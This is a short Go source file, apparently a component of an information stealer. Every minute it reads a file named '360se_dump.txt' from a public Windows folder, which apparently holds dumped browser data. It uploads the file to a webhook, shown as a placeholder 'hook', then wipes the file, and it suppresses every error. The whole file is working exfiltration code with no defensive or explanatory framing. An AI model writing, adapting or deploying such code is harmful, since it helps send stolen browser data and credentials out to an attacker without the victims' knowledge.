package upload

import (
	"bytes"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"time"
)

func clearFile(filePath string) {
	err := ioutil.WriteFile(filePath, []byte(""), 0644)
	if err != nil {
		return
	}

}

func Run() {
	filePath := "C:\\Users\\Public\\Libraries\\360se_dump.txt"
	for {
		upload()
		clearFile(filePath)
		time.Sleep(1 * time.Minute)
	}

}
func upload() {
	webhookURL := "hook"

	filePath := "C:\\Users\\Public\\Libraries\\360se_dump.txt"
	file, err := os.Open(filePath)
	if err != nil {

		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filePath)
	if err != nil {
		return
	}
	_, err = io.Copy(part, file)
	if err != nil {

		return
	}
	writer.Close()

	req, err := http.NewRequest("POST", webhookURL, body)
	if err != nil {

		return
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := http.Client{}
	resp, err := client.Do(req)
	if err != nil {

		return
	}
	defer resp.Body.Close()

}
